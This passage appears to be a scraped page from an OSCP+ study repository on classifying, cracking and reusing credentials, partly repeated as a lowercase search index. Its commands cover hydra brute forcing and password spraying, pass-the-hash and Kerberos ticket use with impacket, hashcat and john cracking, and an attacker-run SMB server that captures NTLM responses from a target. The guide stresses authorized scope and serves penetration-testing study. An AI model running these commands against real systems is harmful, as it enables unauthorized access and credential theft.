2](https://www.openwall.com/john/). ## http basic authentication — validate the challenge and failure signal use when the endpoint returns a real http basic challenge. a custom html login form is a different mechanism. ```bash curl -i http://target:port/protected_path curl -i --basic -u user http://target:port/protected_path # only when bounded online guessing is justified by scope and lockout controls hydra -l user -p wordlist -s port -t 1 -f target http-get /protected_path ``` read: distinguish an accepted http identity from permission to the protected function. confirm a reported success with curl/browser. redirects, uniform 200 pages or a mismatched realm/path make weak success detectors; fix the request before increasing guesses. sources: [upstream 1](https://github.com/vanhauser-thc/thc-hydra) · [upstream 2](https://curl.se/docs/manpage.html). ## change an account’s own expired/known smb password use when you know the old password and the account is allowed or required to change it. this is not an administrative reset of another account. ```bash # prompts for the old and new password on the specified server/dc smbpasswd -r dc_host -u 'domain/user' ``` read: a successful change means subsequent password logins need the new value; existing ticket/session contexts do not automatically become new logons. failure → check account scope, password policy, connectivity and change-password rights. test the new password with the relevant native service client before moving on. sources: [upstream 1](https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html). ## generate a bounded numeric list for an observed identifier pattern use when actual examples indicate a small numeric id/range. keep generated input separate from the decision to send online requests. ```bash # unpadded ids seq 0 999 > numbers.txt # fixed-width values, only when the observed application uses that format seq -w 0 999 > numbers-padded.txt ``` read: a matching format is a candidate input list, not permission to enumerate every object. use the real session and compare owned/other/disallowed-object controls in the existing authorization workflow. expand the range only when returned evidence justifies it. sources: [upstream 1](https://www.gnu.org/software/coreutils/manual/html_node/seq-invocation.html). ## an application authenticates to your explicit smb endpoint use only when an observed application/file-request primitive can contact an explicitly supplied smb path and the network/account policy permits ntlm. this workflow does not poison names or spoof network identities. ```bash # attacker: serve the intended directory and keep the authentication log mkdir -p share sudo impacket-smbserver share ./share -smb2support 2>&1 | tee smb-server.log # a captured net-ntlmv2 line is an offline-recovery artifact, not an nt hash hashcat -m 5600 netntlmv2.txt wordlist hashcat -m 5600 netntlmv2.txt --show ``` supply the actual application with the intended `\\lhost\share\file` path only through the already verified input mechanism. read: retain the entire challenge-response line and the reported account/domain. no callback can be routing, smb egress or ntlm policy; a callback without recoverable credentials is not a password. validate a recovered plaintext password in the matching identity. do not substitute this response for the nt hash expected by pass-the-hash tools. sources: [upstream 1](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) · [upstream 2](https://hashcat.net/wiki/doku.php?id=example_hashes). ## sources - [getsh password cracking route](https://lizajose.github.io/getsh/password-cracking), source snapshot [`e1f62dd`](https://github.com/lizajose/getsh/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - supplied pen-200 chapter 16, pp442-493 - [hexdump windows hash and credential sections](https://github.com/leonardoe95/oscp/blob/main/modules/windows/windows-privesc-cheatsheet.txt) - [current oscp+ body of knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-oscp-body-of-knowledge) - [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) - [john the ripper documentation](https://www.openwall.com/john/doc/) - [hydra official repository](https://github.com/vanhauser-thc/thc-hydra) - [netexec credential use](https://www.netexec.wiki/getting-started/using-credentials) - [impacket official repository](https://github.com/fortra/impacket) - [openssh manual](https://man.openbsd.org/ssh) - [current oscp+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-oscp-exam-guide)

## credential record

```text
source -> material/format -> local/domain/application identity
```

sections.title: Classify before acting
sections.search:
## classify before acting

| material | recognition | compatible use |
| --- | --- | --- |
| cleartext password | text tied to an identity/source | normal protocol/application login |
| ssh private key | openssh/pem private-key block | ssh public-key authentication; recover passphrase offline if protected |
| linux password record | `user:$id$salt$digest:...` | offline recovery with complete record/format |
| application/file verifier | tool-specific `$...$` or documented digest | offline recovery with matching mode/parser |
| nt hash | usually 32 hex from sam/lsass/ntds context | offline recovery; pth where ntlm and the client support it |
| net-ntlmv2 response | `user::domain:challenge:proof:blob` | offline recovery or live relay under specific conditions; not pth material |
| dcc2/mscache v2 | username-dependent cached-domain verifier | offline recovery; not ordinary pth material |
| kerberos ticket | `.kirbi`, ccache or in-memory cache | ticket-specific access subject to realm, spn, validity, clock and route |
| kerberos roast material | `$krb5asrep$...` or `$krb5tgs$...` | offline recovery with matching enctype/mode |
| session/api token | cookie, bearer/jwt or application token | issuing application and authorization context only |

do not feed unknown strings into random modes. preserve the source and identity context, then identify the format:

```bash
hashid hash_or_file
john --list=formats | grep -i keyword
hashcat -hh | grep -i keyword
hashcat --example-hashes | less
```

> **failure cue:** `no hashes loaded`, token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password.

sections.title: Validate one known password
sections.search:
## validate one known password use the normal client for the observed service: ```bash ssh -o preferredauthentications=password -p port user@target nxc smb target -d domain -u user -p 'password' --shares evil-winrm -i target -u user -p 'password' xfreerdp /v:target /u:'domain\user' /p:'password' /cert:ignore ``` local windows account: ```bash nxc smb target --local-auth -u user -p 'password' --shares ``` > **decisive output:** the destination service accepts the intended identity. share, session or action access is a separate authorization result.
variant — known user, targeted password dictionary ```bash hydra -l user -p wordlist -s port -t 4 -f ssh://target hydra -l user -p wordlist -t 1 -f rdp://target ``` use only on an assigned target after checking lockout and rate controls. confirm every reported success with the normal client.
variant — one password across an authorized user list ```bash hydra -l users -p 'password' -s port -t 1 rdp://target nxc smb target -d domain -u users -p 'password' --continue-on-success ``` one attempt per account can still trigger lockout or monitoring. establish scope, threshold/window and observation period first.
variant — http post form capture a correct request and stable failure marker with burp: ```bash hydra -l user -p wordlist target http-post-form \ '/login_path:username=^user^&password=^pass^:f=stable_failure_text' ``` dynamic csrf tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. a weak failure marker creates false positives.
runascs — test a known password from an existing windows shell use a reviewed, compatible build on the current windows host with a known plaintext password. this creates a new local process/logon context; it is not remote execution and does not turn an nt hash into a password. ```cmd rem domain account: verify the new process token runascs.exe user password "cmd /c whoami /all" -d domain rem local account: omit the domain switch for the current host's account runascs.exe user password "cmd /c whoami /all" rem network-only credentials: local identity stays unchanged runascs.exe user password "cmd /c dir \\target\share" -d domain -l 9 ``` > **read:** in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. with logon type 9, local whoami is not a credential test: use the remote operation's result. logon failure → check account scope, password and permitted logon type. an accepted logon with access denied → inspect authorization on that resource. [runascs upstream](https://github.com/antoniococo/runascs). native runas remains an alternative when an interactive password prompt is usable. neither tool guarantees an elevated token.

sections.title: Estimate feasibility
sections.search:
## estimate feasibility

```bash
hashcat -b -m mode
python3 -c "print((charset_size ** length) / guesses_per_second)"
```

use the actual mode and hardware rate. salts prevent reusable precomputation; iterations and memory-hard kdfs reduce guesses per second. prefer candidates in this order:

```text
exact recovered/default candidates -> organization/user/product words
-> observed policy and mutations -> small dictionary plus rules
-> known mask/hybrid -> broader curated lists/rules
-> exhaustive search only when its measured cost is defensible
```

preview mutations before spending the candidate budget:

```bash
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50
john --wordlist=wordlist.txt --rules=jumbo --stdout | head -n 50
```

sections.title: Hashcat baseline and meaningful modes
sections.search:
## hashcat baseline and meaningful modes ```bash hashcat -a 0 -m mode hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job hashcat -m mode hashes.txt --show ``` > `-a 0` is dictionary mode. do not use `-a 3` with a wordlist; attack mode 3 expects a mask. common source examples identify ntlm as mode `1000`, net-ntlmv2 as `5600` and keepass as `13400`, but confirm against the installed version: ```bash hashcat -h | grep -ei 'ntlm|netntlmv2|keepass|openssh' ```
mask and session variants ```bash hashcat -m mode hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask hashcat --session targeted-mask --restore ``` > mask order is a hypothesis about structure. estimate its keyspace before committing time.
hybrid variant — base word plus three digits ```bash hashcat -a 6 -m mode hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid ``` use only when evidence supports both the base words and suffix shape.

sections.title: John the Ripper workflow
sections.search:
## john the ripper workflow

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

```bash
john --format=format --wordlist=wordlist.txt --rules=jumbo hash.txt
john --session=crack-job --wordlist=wordlist.txt hash.txt
john --restore=crack-job
```

file-to-hash converters:

```bash
zip2john archive.zip > archive.hash
7z2john archive.7z > archive.hash
ssh2john id_rsa > ssh.hash
keepass2john vault.kdbx > keepass.hash
pdf2john document.pdf > pdf.hash
office2john document.docx > office.hash
rar2john archive.rar > rar.hash
unshadow passwd.copy shadow.copy > linux.hash
```

converter availability varies by package/path; locate it rather than assuming:

```bash
command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null
```

> preserve the complete converter output. some formats include a filename label before `:` that john accepts but hashcat may require removed from a separate tool-specific copy.

sections.title: KeePass database
sections.search:
## keepass database

```bash
keepass2john vault.kdbx > keepass.hash
john --wordlist=wordlist.txt keepass.hash
john --show keepass.hash
```

hashcat alternative after confirming kdbx/kdf and input format:

```bash
hashcat -hh | grep -i keepass
hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13400 keepass.hash --show
```

> mode `13400` covers common keepass 1/2 aes formats. installed help and example hashes decide for the actual file. a recovered master password still requires opening and validating the vault.

sections.title: SSH private-key passphrase
sections.search:
## ssh private-key passphrase ```bash ssh2john id_rsa > ssh.hash john --wordlist=wordlist.txt ssh.hash john --show ssh.hash chmod 600 id_rsa ssh-keygen -y -f id_rsa > derived.pub ssh -vv -i id_rsa -o identitiesonly=yes -p port user@target ``` > cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. `permission denied (publickey)` can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock.
hashcat variant — only for a supported openssh format ```bash hashcat -hh | grep -i 'openssh\|private key' hashcat -a 0 -m mode ssh.hash wordlist.txt -r rule_file ``` choose `mode` from the complete `$sshng$...` structure and installed help. token-length or unsupported-cipher errors require a compatible parser/tool, not `--force` with a wrong mode.

sections.title: Linux password records
sections.search:
## linux password records

```bash
unshadow passwd.copy shadow.copy > linux.hash
john --wordlist=wordlist.txt --rules=jumbo linux.hash
john --show linux.hash
```

> preserve username, uid, shell and lock markers. a recovered password does not override ssh settings, `su` policy or a disabled account.

sections.title: NT hash
sections.search:
## nt hash offline recovery: ```bash hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule john --format=nt --wordlist=wordlist.txt nt.hash ``` compatible smb validation: ```bash nxc smb target -d domain -u user -h nt_hash --shares smbclient //target/share -u 'domain\user' --pw-nt-hash nt_hash ``` > nt hashes come from a producing context such as sam, lsass or ntds. a visually similar 32-hex application digest is not pth material.
variant — remote access/execution when the identity has matching rights ```bash impacket-wmiexec -hashes :nt_hash 'domain/user@target' impacket-psexec -hashes :nt_hash 'domain/user@target' xfreerdp /v:target /u:'domain\user' /pth:nt_hash /cert:ignore ``` wmi needs administrative rights plus dcom/rpc/smb reachability and normally runs as the authenticated user. psexec-style execution needs service-control and writable-share rights and commonly yields system. rdp hash authentication depends on target/client support and policy. detailed method selection belongs to the lateral-movement procedure.

sections.title: Net-NTLMv2 response
sections.search:
## net-ntlmv2 response

```bash
hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt
john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash
```

> a net-ntlmv2 response is not an nt hash and cannot be supplied to `-h` or `-hashes`. relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights.

the oscp+ exam prohibits spoofing, including nbns. do not use responder poisoning on the exam. keep capture/relay work to explicitly authorized labs and recheck the current guide.

sections.title: DCC2 / cached domain logon
sections.search:
## dcc2 / cached domain logon

```bash
hashcat -hh | grep -i 'domain cached'
john --format=mscash2 --wordlist=wordlist.txt dcc2.hash
```

> preserve the username because it participates in the verifier. dcc2 is an offline recovery target, not ordinary pth material.

sections.title: Kerberos tickets and caches
sections.search:
## kerberos tickets and caches

inspect before use:

```bash
klist
krb5ccname=ticket.ccache klist
impacket-ticketconverter ticket.kirbi ticket.ccache
```

compatible client example:

```bash
export krb5ccname=ticket.ccache
impacket-wmiexec -k -no-pass 'domain/user@host.domain'
```

> verify client principal, realm, tgt versus service ticket, spn, start/end time, clock, dns/fqdn and routes. a readable cache does not prove authorization. roasting, forging and detailed ptt/overpass belong to the ad procedures.

sections.title: Credential Guard boundary
sections.search:
## credential guard boundary

```powershell
get-computerinfo | select-object deviceguardsecurityservicesconfigured,deviceguardsecurityservicesrunning
```

credential guard can isolate reusable domain secrets from ordinary lsass memory. it does not erase local sam, file, vault, dpapi, ticket, service-configuration or directory-right paths. one failed dump method disproves only that method and context. intrusive ssp interception changes system state and waits for a future logon; it is not the default block 5 response.

sections.title: Failure routing
sections.search:
## failure routing

| failure | interpretation / next action |
| --- | --- |
| timeout/no route | fix source position, pivot or service reachability before judging the credential |
| wrong tls/protocol response | reconfirm application and required transport |
| local/domain/upn mismatch | retry only an evidence-backed identity form |
| account disabled/locked/expired/restricted | stop guessing; preserve possible credential validity and record state |
| password/public-key/ntlm/kerberos method rejected | choose material/client compatible with server policy |
| authentication succeeds, requested action fails | credential is valid; enumerate authorization and another relevant service |
| hash parser rejects input | recheck complete line, prefix, converter, mode and version |
| key unlocks but ssh rejects it | recheck user, server, authorized-key state and algorithm policy |
| ticket loads but service rejects it | check expiry, spn, realm, clock, dns and service authorization |
| pth login succeeds but execution fails | check admin rights, uac remote restrictions and method-specific ports/rights |

sections.title: Re-enumerate after success
sections.search:
## re-enumerate after success

```text
accepted identity -> groups/roles -> reachable services -> shares/files
-> authenticated application behavior -> accessible hosts/routes
-> new credentials/tickets/sessions -> privilege and movement handoffs
```

verify destination host, accepted identity and actual read/write/execute rights. new hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter ad mapping.

sections.title: Build a small site-specific wordlist with CeWL
sections.search:
## build a small site-specific wordlist with cewl

use when observed organization, product or account vocabulary could improve an offline recovery attempt. keep the crawl on the assigned site.

```bash
# bounded crawl: depth 1, words of at least five characters
cewl -d 1 -m 5 --lowercase -w site-words.txt http://target:port/

# review before using it in the existing format-specific recovery command
head -n 30 site-words.txt
wc -l site-words.txt
```

read: useful vocabulary is a candidate list, not a recovered password. an authenticated or js-only page may expose little to the crawler. use the already identified hashcat/john format, then apply a small relevant rule/mask rather than immediately creating an enormous list.

sources: [upstream 1](https://github.com/digininja/cewl).

sections.title: Generate usernames from observed naming conventions
sections.search:
## generate usernames from observed naming conventions

use when you have names and at least one real account/email that reveals a likely format. put only relevant names in names.txt.

```bash
# review supported format names in this installed version
./username-anarchy --list-formats

# restrict output to plausible formats rather than every permutation
./username-anarchy -i names.txt -f first,first.last,flast,f.last > users.txt
sort -u users.txt -o users.txt
```

read: these are candidates. confirm names with authorized directory/user enumeration; an email local part is not automatically a domain account. keep domain, local-machine and application namespaces distinct. use kerbrute's username probe only when the kdc path and domain are known.

sources: [upstream 1](https://github.com/urbanadventurer/username-anarchy).

sections.title: Targeted candidates — Crunch, CUPP and rules
sections.search:
## targeted candidates — crunch, cupp and rules

use a mask/profile only when evidence justifies it. this example expands a known six-character stem with three digits; it creates 1,000 candidates.

```bash
crunch 9 9 -t 'foobar%%%' -o stem-digits.txt

# interactive profile-based alternative, when relevant clues exist
python3 cupp.py -i

# preview a rule expansion before choosing the recovery job
hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule | head -n 40
```

read: calculate candidate count and use the matching offline format. cupp asks questions; invented personal details do not improve the list. a three-digit suffix or a rule is a hypothesis, not a reason to spray every generated value at an online login.

sources: [upstream 1](https://www.kali.org/tools/crunch/) · [upstream 2](https://github.com/mebus/cupp) · [upstream 3](https://hashcat.net/wiki/).

sections.title: Password-protected ZIP — direct test or extracted verifier
sections.search:
## password-protected zip — direct test or extracted verifier

use when the artifact is an encrypted zip and its encryption is supported by the selected tool.

```bash
# dictionary attack; -u checks candidates by attempting extraction
fcrackzip -u -d -p wordlist archive.zip

# alternative: extract a verifier for john, preserving the original archive
zip2john archive.zip > archive.hash
john --wordlist=wordlist archive.hash
john --show archive.hash
```

read: confirm a candidate by opening/extracting the intended file. an unsupported encryption type or empty verifier is a format/tool issue, not proof that the password is unguessable. reuse the recovered value only after identifying its account/service context.

sources: [upstream 1](https://www.kali.org/tools/fcrackzip/) · [upstream 2](https://www.openwall.com/john/).

sections.title: HTTP Basic authentication — validate the challenge and failure signal
sections.search:
## http basic authentication — validate the challenge and failure signal

use when the endpoint returns a real http basic challenge. a custom html login form is a different mechanism.

```bash
curl -i http://target:port/protected_path
curl -i --basic -u user http://target:port/protected_path

# only when bounded online guessing is justified by scope and lockout controls
hydra -l user -p wordlist -s port -t 1 -f target http-get /protected_path
```

read: distinguish an accepted http identity from permission to the protected function. confirm a reported success with curl/browser. redirects, uniform 200 pages or a mismatched realm/path make weak success detectors; fix the request before increasing guesses.

sources: [upstream 1](https://github.com/vanhauser-thc/thc-hydra) · [upstream 2](https://curl.se/docs/manpage.html).

sections.title: Change an account’s own expired/known SMB password
sections.search:
## change an account’s own expired/known smb password

use when you know the old password and the account is allowed or required to change it. this is not an administrative reset of another account.

```bash
# prompts for the old and new password on the specified server/dc
smbpasswd -r dc_host -u 'domain/user'
```

read: a successful change means subsequent password logins need the new value; existing ticket/session contexts do not automatically become new logons. failure → check account scope, password policy, connectivity and change-password rights. test the new password with the relevant native service client before moving on.

sources: [upstream 1](https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html).

sections.title: Generate a bounded numeric list for an observed identifier pattern
sections.search:
## generate a bounded numeric list for an observed identifier pattern

use when actual examples indicate a small numeric id/range. keep generated input separate from the decision to send online requests.

```bash
# unpadded ids
seq 0 999 > numbers.txt

# fixed-width values, only when the observed application uses that format
seq -w 0 999 > numbers-padded.txt
```

read: a matching format is a candidate input list, not permission to enumerate every object. use the real session and compare owned/other/disallowed-object controls in the existing authorization workflow. expand the range only when returned evidence justifies it.

sources: [upstream 1](https://www.gnu.org/software/coreutils/manual/html_node/seq-invocation.html).

sections.title: An application authenticates to your explicit SMB endpoint
sections.search:
## an application authenticates to your explicit smb endpoint

use only when an observed application/file-request primitive can contact an explicitly supplied smb path and the network/account policy permits ntlm. this workflow does not poison names or spoof network identities.

```bash
# attacker: serve the intended directory and keep the authentication log
mkdir -p share
sudo impacket-smbserver share ./share -smb2support 2>&1 | tee smb-server.log

# a captured net-ntlmv2 line is an offline-recovery artifact, not an nt hash
hashcat -m 5600 netntlmv2.txt wordlist
hashcat -m 5600 netntlmv2.txt --show
```

supply the actual application with the intended `\\lhost\share\file` path only through the already verified input mechanism. read: retain the entire challenge-response line and the reported account/domain. no callback can be routing, smb egress or ntlm policy; a callback without recoverable credentials is not a password. validate a recovered plaintext password in the matching identity. do not substitute this response for the nt hash expected by pass-the-hash tools.

sources: [upstream 1](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) · [upstream 2](https://hashcat.net/wiki/doku.php?id=example_hashes).

# Credential Classification, Cracking and Reuse [← Stage index](README.md) | [Credential cheatsheet](../../cheatsheets/credentials-cracking.md) | [AD procedures](../06-ad-lateral-movement/README.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Recover and use authentication material](../../notes/methods/credentials.md); [Gain a more useful domain identity](../../notes/methods/ad-identities.md) > **Purpose:** distinguish authentication material, estimate whether offline recovery is worthwhile, and test only compatible, evidence-backed uses. Actual credentials belong in private records. ## Credential record ```text SOURCE -> MATERIAL/FORMAT -> LOCAL/DOMAIN/APPLICATION IDENTITY -> POSSIBLE USE -> SERVICE/PROTOCOL -> AUTHENTICATION -> AUTHORIZATION -> NEW ACCESS -> RE-ENUMERATION ``` Record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together. ## Classify before acting | Material | Recognition | Compatible use | | --- | --- | --- | | Cleartext password | Text tied to an identity/source | Normal protocol/application login | | SSH private key | OpenSSH/PEM private-key block | SSH public-key authentication; recover passphrase offline if protected | | Linux password record | `USER:$id$salt$digest:...` | Offline recovery with complete record/format | | Application/file verifier | Tool-specific `$...$` or documented digest | Offline recovery with matching mode/parser | | NT hash | Usually 32 hex from SAM/LSASS/NTDS context | Offline recovery; PtH where NTLM and the client support it | | Net-NTLMv2 response | `USER::DOMAIN:challenge:proof:blob` | Offline recovery or live relay under specific conditions; not PtH material | | DCC2/MSCache v2 | Username-dependent cached-domain verifier | Offline recovery; not ordinary PtH material | | Kerberos ticket | `.kirbi`, ccache or in-memory cache | Ticket-specific access subject to realm, SPN, validity, clock and route | | Kerberos roast material | `$krb5asrep$...` or `$krb5tgs$...` | Offline recovery with matching enctype/mode | | Session/API token | Cookie, bearer/JWT or application token | Issuing application and authorization context only | Do not feed unknown strings into random modes. Preserve the source and identity context, then identify the format: ```bash hashid HASH_OR_FILE john --list=formats | grep -i KEYWORD hashcat -hh | grep -i KEYWORD hashcat --example-hashes | less ``` > **Failure cue:** `No hashes loaded`, token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password. ## Validate one known password Use the normal client for the observed service: ```bash ssh -o PreferredAuthentications=password -p PORT USER@TARGET nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ``` Local Windows account: ```bash nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares ``` > **Decisive output:** the destination service accepts the intended identity. Share, session or action access is a separate authorization result.
Variant — known user, targeted password dictionary ```bash hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET ``` Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client.
Variant — one password across an authorized user list ```bash hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success ``` One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first.
Variant — HTTP POST form Capture a correct request and stable failure marker with Burp: ```bash hydra -l USER -P WORDLIST TARGET http-post-form \ '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT' ``` Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives.
RunasCs — test a known password from an existing Windows shell Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password. ```cmd REM Domain account: verify the new process token RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN REM Local account: omit the domain switch for the current host's account RunasCs.exe USER PASSWORD "cmd /c whoami /all" REM Network-only credentials: local identity stays unchanged RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9 ``` > **Read:** in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource. [RunasCs upstream](https://github.com/antonioCoco/RunasCs). Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token.
## Estimate feasibility ```bash hashcat -b -m MODE python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)" ``` Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order: ```text exact recovered/default candidates -> organization/user/product words -> observed policy and mutations -> small dictionary plus rules -> known mask/hybrid -> broader curated lists/rules -> exhaustive search only when its measured cost is defensible ``` Preview mutations before spending the candidate budget: ```bash hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50 john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50 ``` ## Hashcat baseline and meaningful modes ```bash hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job hashcat -m MODE hashes.txt --show ``` > `-a 0` is dictionary mode.
